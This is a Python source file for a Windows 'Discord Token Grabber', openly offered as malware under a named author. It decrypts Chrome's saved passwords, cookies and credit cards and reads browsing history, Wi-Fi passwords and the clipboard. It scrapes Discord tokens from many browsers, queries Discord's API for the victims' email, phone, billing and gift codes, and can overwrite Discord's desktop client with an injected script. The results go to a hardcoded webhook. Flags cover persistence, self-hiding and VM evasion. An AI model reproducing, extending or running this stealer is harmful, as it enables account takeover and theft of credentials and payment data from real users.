#Discord Token Grabber Made by ooAnshul#2427

import os, urllib3, base64, sys, json, re, random, shutil, traceback, discord_webhook, sqlite3
from threading import Thread
import subprocess
from win32crypt import CryptUnprotectData
from pyaes import AESModeOfOperationGCM

if os.name != 'nt':
    os._exit(1)

if hasattr(sys, 'frozen'):
    MEIPASS = sys._MEIPASS
else:
    MEIPASS = os.path.dirname(__file__)

if os.path.isfile(configpath := os.path.join(MEIPASS, 'config.json')):
    with open(configpath) as file:
        _config = json.load(file)
else:
    _config = dict()

WEBHOOK = 'https://discordapp.com/api/webhooks/1062400884664959016/7duYSewf9DUfaAqfGPkzG0TM2tYN3rqP3PVfm8S8FMKvfX3Q0Brmlo1ZvmCYEN9cwSwu'
PINGME = _config.get('PINGME', True)
VMPROTECT = _config.get('VMPROTECT', True) 
BSOD = _config.get('BSOD', False) 
STARTUP = _config.get('STARTUP', True) 
HIDE_ITSELF = _config.get('HIDE_ITSELF', True) 
MESSAGE_BOX = _config.get('MSGBOX', dict()) 
CAPTURE_WEBCAM = False 
INJECT_JS = True 

class Browsers:
    CHROMEENCRYPTIONKEY = None
    CHROMEPATH = os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data')

    @staticmethod
    def getChromeEncryptionKey() -> bytes:
        if Browsers.CHROMEENCRYPTIONKEY is not None:
            return Browsers.CHROMEENCRYPTIONKEY

        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        if not os.path.isfile(local_state_path):
            return
        
        with open(local_state_path) as file:
            tree = json.load(file)
        
        key = tree.get("os_crypt")
        if key is None:
            return
        
        key = key.get("encrypted_key")
        if key is None:
            return
        key = base64.b64decode(key)[5:]

        Browsers.CHROMEENCRYPTIONKEY = CryptUnprotectData(key, None, None, None, 0)[1]
        return Browsers.CHROMEENCRYPTIONKEY
    
    @staticmethod
    def chromeDecryptData(data) -> str:
        key = Browsers.getChromeEncryptionKey()
        if key is None:
            return None
        try:
            iv = data[3:15]
            data = data[15:]
            return (AESModeOfOperationGCM(key, iv).decrypt(data)[:-16]).decode()
        except Exception:
            try:                
                return str(CryptUnprotectData(data, None, None, None, 0)[1])
            except Exception:
                return None

    @staticmethod
    def getChromePass() -> list[dict]:
        Passwords = list()
        if not os.path.isdir(Browsers.CHROMEPATH) or not Browsers.getChromeEncryptionKey():
            return Passwords

        loginDataPaths = list()
        for root, _, files in os.walk(Browsers.CHROMEPATH):
            for file in files:
                if file.lower() == 'login data':
                    filepath = os.path.realpath(os.path.join(root, file))
                    loginDataPaths.append(filepath)
        
        for path in loginDataPaths:
            if hasattr(sys, 'frozen'):
                tempfile = os.path.join(MEIPASS, 'loginData.db')
            else:
                tempfile = os.path.join(os.getenv('temp'), 'loginData.db')
            shutil.copyfile(path, tempfile)
            db = sqlite3.connect(tempfile)
            db.text_factory = lambda b: b.decode(errors= 'ignore')
            cursor = db.cursor()
            for res in cursor.execute('SELECT origin_url, username_value, password_value FROM logins').fetchall():
                URL, USERNAME, PASSWORD = res
                PASSWORD = Browsers.chromeDecryptData(PASSWORD)
                if URL and USERNAME and PASSWORD:
                    Passwords.append({
                        'URL' : URL,
                        'USERNAME' : USERNAME,
                        'PASSWORD' : PASSWORD
                    })
            cursor.close()
            db.close()
            os.remove(tempfile)
        return Passwords
    
    @staticmethod
    def getChromeCookies() -> list[dict]:
        Cookies = list()
        if not os.path.isdir(Browsers.CHROMEPATH) or not Browsers.getChromeEncryptionKey():
            return Cookies

        cookieDataPaths = list()
        for root, _, files in os.walk(Browsers.CHROMEPATH):
            for file in files:
                if file.lower() == 'cookies':
                    filepath = os.path.realpath(os.path.join(root, file))
                    cookieDataPaths.append(filepath)
        
        for path in cookieDataPaths:
            if hasattr(sys, 'frozen'):
                tempfile = os.path.join(MEIPASS, 'cookiesData.db')
            else:
                tempfile = os.path.join(os.getenv('temp'), 'cookiesData.db')
            shutil.copyfile(path, tempfile)
            db = sqlite3.connect(tempfile)
            db.text_factory = lambda b: b.decode(errors= 'ignore')
            cursor = db.cursor()
            for res in cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies').fetchall():
                HOST, NAME, PATH, COOKIE, EXPIRY = res
                COOKIE = Browsers.chromeDecryptData(COOKIE)
                if HOST and NAME and COOKIE:
                    Cookies.append({
                        'HOST' : HOST,
                        'NAME' : NAME,
                        'PATH' : PATH,
                        'COOKIE' : COOKIE,
                        'EXPIRY' : EXPIRY
                    })
            cursor.close()
            db.close()
            os.remove(tempfile)
        return Cookies

    @staticmethod
    def getChromeCC() -> list[dict]:
        Cards = list()
        if not os.path.isdir(Browsers.CHROMEPATH) or not Browsers.getChromeEncryptionKey():
            return Cards
        
        ccDataPaths = list()
        for root, _, files in os.walk(Browsers.CHROMEPATH):
            for file in files:
                if file.lower() == 'web data':
                    filepath = os.path.realpath(os.path.join(root, file))
                    ccDataPaths.append(filepath)
        
        for path in ccDataPaths:
            if hasattr(sys, 'frozen'):
                tempfile = os.path.join(MEIPASS, 'ccData.db')
            else:
                tempfile = os.path.join(os.getenv('temp'), 'ccData.db')
            shutil.copyfile(path, tempfile)
            db = sqlite3.connect(tempfile)
            db.text_factory = lambda b: b.decode(errors= 'ignore')
            cursor = db.cursor()
            for res in cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards').fetchall():
                NAME, MONTH, YEAR, NUMBER = res
                if not (NAME and NUMBER):
                    continue
                NUMBER = Browsers.chromeDecryptData(NUMBER)
                Cards.append({
                    'NAME' : NAME,
                    'MONTH' : MONTH,
                    'YEAR' : YEAR,
                    'NUMBER' : NUMBER
                })
            cursor.close()
            db.close()
            os.remove(tempfile)

        return Cards
    
    @staticmethod
    def getChromeHistory() -> list[tuple]:
        History = list()
        if not os.path.isdir(Browsers.CHROMEPATH):
            return History
        
        historyDataPaths = list()
        for root, _, files in os.walk(Browsers.CHROMEPATH):
            for file in files:
                if file.lower() == 'history':
                    filepath = os.path.realpath(os.path.join(root, file))
                    historyDataPaths.append(filepath)
        
        for path in historyDataPaths:
            if hasattr(sys, 'frozen'):
                tempfile = os.path.join(MEIPASS, 'historyData.db')
            else:
                tempfile = os.path.join(os.getenv('temp'), 'historyData.db')
            shutil.copyfile(path, tempfile)
            db = sqlite3.connect(tempfile)
            db.text_factory = lambda b: b.decode(errors= 'ignore')
            cursor = db.cursor()
            for res in cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls').fetchall():
                URL, TITLE, VC, LVT = res
                if URL and TITLE and VC and LVT:
                    History.append((URL, TITLE, VC, LVT))
            History.sort(key= lambda x: x[3], reverse= True)
            cursor.close()
            db.close()
            os.remove(tempfile)
        return History


class utils:
    ERRORLOGS = list()

    @staticmethod
    def generate(num= 5, invisible= False) -> str:
        if not invisible:
            return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=num))
        else:
            return "".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k= num))
    
    @staticmethod
    def copy(src, dst) -> None:
        if not os.path.exists(src):
            return
        os.makedirs(os.path.dirname(dst), exist_ok= True)
        if os.path.isdir(src):
            shutil.copytree(src, dst)
        else:
            shutil.copyfile(src, dst)
    
    @staticmethod
    def catch(func):
        def newfunc(*args, **kwargs):
            try:
                return func(*args, **kwargs)
            except Exception as e:
                trb = traceback.extract_tb(sys.exc_info()[2])[-1]
                utils.ERRORLOGS.append(f"Line {trb[1]} : {trb[2]} : {e.__class__.__name__} : {e}")
        return newfunc
    
    @staticmethod
    def messagebox(config) -> None:
        title = config.get("title")
        message = config.get("message")
        icon = config.get("icon")
        buttons = config.get("buttons")

        if not all(x is not None for x in (title, message, icon, buttons)):
            return
            
        title = title.replace("\x22", "\\x22").replace("\x27", "\\x22")
        message = message.replace("\x22", "\\x22").replace("\x27", "\\x22")
            
        cmd = f'''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{message}', 0, '{title}', {icon}+{buttons});close()"'''
        subprocess.Popen(cmd, shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
    
    @staticmethod
    def getWifiPasswords() -> dict:
        profiles = list()
        passwords = dict()

        for line in subprocess.run('netsh wlan show profile', shell= True, capture_output= True).stdout.decode(errors= 'ignore').strip().splitlines():
            if 'All User Profile' in line:
                name= line[(line.find(':') + 1):].strip()
                profiles.append(name)
        
        for profile in profiles:
            found = False
            for line in subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell= True, capture_output= True).stdout.decode(errors= 'ignore').strip().splitlines():
                if 'Key Content' in line:
                    passwords[profile] = line[(line.find(':') + 1):].strip()
                    found = True
                    break
            if not found:
                passwords[profile] = '(None)'
        return passwords
    
    @staticmethod
    def tree(path, DName= None) -> str:
        if DName is None:
            DName = os.path.basename(path)
        PIPE = "│"
        ELBOW = "└──"
        TEE = "├──"
        tree = subprocess.run("tree /A /F", shell= True, capture_output= True, cwd= path).stdout.decode(errors= 'ignore')
        tree = tree.replace("+---", TEE).replace(r"\---", ELBOW).replace("|", PIPE).splitlines()
        tree = DName + "\n" + "\n".join(tree[3:])
        return tree.strip()

    @staticmethod
    def getClipboard() -> str:
        return subprocess.run("powershell Get-Clipboard", shell= True, capture_output= True).stdout.decode(errors= 'backslashreplace').strip()

class Discord:
    ROAMING = os.getenv('appdata')
    LOCALAPPDATA = os.getenv('localappdata')
    http = urllib3.PoolManager()

    @staticmethod
    def getHeaders(token= None):
        headers = {
        "content-type" : "application/json",
        "user-agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36"
        }
        if token:
            headers["authorization"] = token

        return headers
    
    @staticmethod
    def injectJS():
        check = False
        if not os.path.isfile(injectionScript := os.path.join(MEIPASS, 'injection-obfuscated.js')) or not INJECT_JS:
            return
        with open(injectionScript, encoding= 'utf-8') as file:
            code = file.read().replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(WEBHOOK.encode()).decode()))
        
        for dirname in ('Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment'):
            path = os.path.join(os.getenv('localappdata'), dirname)
            if not os.path.isdir(path):
                continue
            for root, _, files in os.walk(path):
                for file in files:
                    if file.lower() == 'index.js':
                        filepath = os.path.realpath(os.path.join(root, file))
                        if os.path.split(os.path.dirname(filepath))[-1] == 'discord_desktop_core':
                            with open(filepath, 'w', encoding= 'utf-8') as file:
                                file.write(code)
                            check = True
            if check:
                check = False
                yield path

    @staticmethod
    def getTokens() -> list[dict]:
        tokens = list()
        data = list()
        paths = {
            'Discord': os.path.join(Discord.ROAMING, 'discord'),
            'Discord Canary': os.path.join(Discord.ROAMING, 'discordcanary'),
            'Lightcord': os.path.join(Discord.ROAMING, 'Lightcord'),
            'Discord PTB': os.path.join(Discord.ROAMING, 'discordptb'),
            'Opera': os.path.join(Discord.ROAMING, 'Opera Software', 'Opera Stable'),
            'Opera GX': os.path.join(Discord.ROAMING, 'Opera Software', 'Opera GX Stable'),
            'Amigo': os.path.join(Discord.LOCALAPPDATA, 'Amigo', 'User Data'),
            'Torch': os.path.join(Discord.LOCALAPPDATA, 'Torch', 'User Data'),
            'Kometa': os.path.join(Discord.LOCALAPPDATA, 'Kometa', 'User Data'),
            'Orbitum': os.path.join(Discord.LOCALAPPDATA, 'Orbitum', 'User Data'),
            'CentBrowse': os.path.join(Discord.LOCALAPPDATA, 'CentBrowser', 'User Data'),
            '7Sta': os.path.join(Discord.LOCALAPPDATA, '7Star', '7Star', 'User Data'),
            'Sputnik': os.path.join(Discord.LOCALAPPDATA, 'Sputnik', 'Sputnik', 'User Data'),
            'Vivaldi': os.path.join(Discord.LOCALAPPDATA, 'Vivaldi', 'User Data'),
            'Chrome SxS': os.path.join(Discord.LOCALAPPDATA, 'Google', 'Chrome SxS', 'User Data'),
            'Chrome': Browsers.CHROMEPATH,
            'FireFox' : os.path.join(Discord.ROAMING, 'Mozilla', 'Firefox', 'Profiles'),
            'Epic Privacy Browse': os.path.join(Discord.LOCALAPPDATA, 'Epic Privacy Browser', 'User Data'),
            'Microsoft Edge': os.path.join(Discord.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data'),
            'Uran': os.path.join(Discord.LOCALAPPDATA, 'uCozMedia', 'Uran', 'User Data'),
            'Yandex': os.path.join(Discord.LOCALAPPDATA, 'Yandex', 'YandexBrowser', 'User Data'),
            'Brave': os.path.join(Discord.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'Iridium': os.path.join(Discord.LOCALAPPDATA, 'Iridium', 'User Data'),
        }

        def RickRollDecrypt(path):

            @utils.catch
            def decrypt_token(encrypted_token, key):
                return (AESModeOfOperationGCM(CryptUnprotectData(key, None, None, None, 0)[1], encrypted_token[3:15]).decrypt(encrypted_token[15:])[:-16]).decode(errors= 'ignore')

            encrypted_tokens = list()
            localstatepath = localstatepath = os.path.join(path, 'Local State')
            with open(localstatepath, 'r', errors= 'ignore') as keyfile:
                try:
                    key = json.load(keyfile)['os_crypt']['encrypted_key']
                except Exception:
                    return
            if not os.path.exists(lvldbdir := os.path.join(path, 'Local Storage', 'leveldb')):
                return
            for file in os.listdir(lvldbdir):
                if not file.endswith(('.log', '.ldb')):
                    continue
                else:
                    for line in [x.strip() for x in open(os.path.join(lvldbdir, file), errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                            if token.endswith('\\'):
                                token = (token[::-1].replace('\\', '', 1))[::-1]
                            if not token in encrypted_tokens:
                                encrypted_tokens.append(token)

            for token in encrypted_tokens:
                token = decrypt_token(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])
                if token:
                    if not token in tokens:
                        tokens.append(token)

        def grabcord(path):
            for filename in os.listdir(path):
                if not filename.endswith(('.log', '.ldb')):
                    continue
                for line in [x.strip() for x in open(os.path.join(path, filename), errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}', line):
                        if not token in tokens:
                            tokens.append(token)
        
        def firefoxtokgrab(path):
            search = subprocess.run('where /r . *.sqlite', shell= True, capture_output= True, cwd = path).stdout.decode(errors= 'ignore')
            if search is not None:
                for path in search.splitlines():
                    if not os.path.isfile(path):
                        continue
                    for line in [x.strip() for x in open(path, errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}', line):
                            if not token in tokens:
                                tokens.append(token)

        token_threads = list()

        for path in paths.items():
            if not os.path.exists(path[1]):
                continue
            elif path[0] in ('FireFox'):
                if path[0] == 'FireFox':
                    t = Thread(target= lambda: firefoxtokgrab(path[1]))
                    token_threads.append(t)
                    t.start()
            else:
                t = Thread(target= lambda: RickRollDecrypt(path[1]))
                token_threads.append(t)
                t.start()
                nextPaths = subprocess.run('dir leveldb /AD /s /b', capture_output= True, shell= True, cwd= path[1]).stdout.decode(errors= 'ignore').strip().splitlines()
                for path in nextPaths:
                    if not os.path.exists(path):
                        continue
                    t = Thread(target= lambda: grabcord(path))
                    token_threads.append(t)
                    t.start()

        for i in token_threads:
            i.join()

        for token in tokens:
                token = token.strip()
                r = Discord.http.request('GET', 'https://discord.com/api/v9/users/@me', headers=Discord.getHeaders(token))
                if r.status!=200:
                    continue
                r = json.loads(r.data.decode())
                user = r['username'] + '#' + str(r['discriminator'])
                id = r['id']
                email = r['email'].strip() if r['email'] else '(No Email)'
                phone = r['phone'] if r['phone'] else '(No Phone Number)'
                verified=r['verified']
                mfa = r['mfa_enabled']
                nitro_data = r.get('premium_type', 0)
                if nitro_data == 0:
                    nitro_data = 'No Nitro'
                elif nitro_data == 1:
                    nitro_data = 'Nitro Classic'
                elif nitro_data == 2:
                    nitro_data = 'Nitro'
                elif nitro_data == 3:
                    nitro_data = 'Nitro Basic'
                else:
                    nitro_data = '(Unknown)'

                billing = json.loads(Discord.http.request('GET', 'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=Discord.getHeaders(token)).data.decode())
                if len(billing) == 0:
                    billing = '(No Payment Method)'
                else:
                    methods = list()
                    for m in billing:
                        method_type = m.get('type', 0)
                        if method_type == 0:
                            methods.append('(Unknown)')
                        elif method_type == 1:
                            methods.append('Card')
                        else:
                            methods.append('Paypal')
                    billing = ', '.join(methods)
                gifts = list()
                r = Discord.http.request('GET', 'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers= Discord.getHeaders(token)).data.decode()
                if 'code' in r:
                    r = json.loads(r)
                    for i in r:
                        code = i.get('code')
                        if i.get('promotion') is None:
                            continue
                        title = i['promotion'].get('outbound_title')
                        if code and title:
                            gifts.append(f'{title}: {code}')
                if len(gifts) == 0:
                    gifts = 'Gift Codes: `NONE`'
                else:
                    gifts = 'Gift Codes:\n\t' + '\n\t'.join(gifts)
                data.append({
                    'USERNAME' : user,
                    'USERID' : id,
                    'MFA' : mfa,
                    'EMAIL' : email,
                    'PHONE' : phone,
                    'VERIFIED' : verified,
                    'NITRO' : nitro_data,
                    'BILLING' : billing,
                    'TOKEN' : token,
                    'GIFTS' : gifts
                })
        tokenData = ""
        for i in data:
            USERNAME, USERID, MFA, EMAIL, PHONE, VERIFIED, NITRO, BILLING, TOKEN, GIFTS = i.values()
            tokenData += "\n"
            tokenData += "\nUsername: `{}`\nUser ID: `{}`\nMFA enabled: `{}`\nEmail: `{}`\nPhone: `{}`\nVerified: `{}`\nNitro: `{}`\nBilling Method(s): `{}`\n\nToken: `{}`\n\n{}\n".format(USERNAME, USERID, 'Yes' if MFA else 'No', EMAIL, PHONE, 'Yes' if VERIFIED else 'No', NITRO, BILLING, TOKEN, GIFTS).strip()
        web = discord_webhook.DiscordWebhook(url=WEBHOOK, content=f"{tokenData}")
        web.execute()

if '__main__' == __name__:
    Discord.getTokens()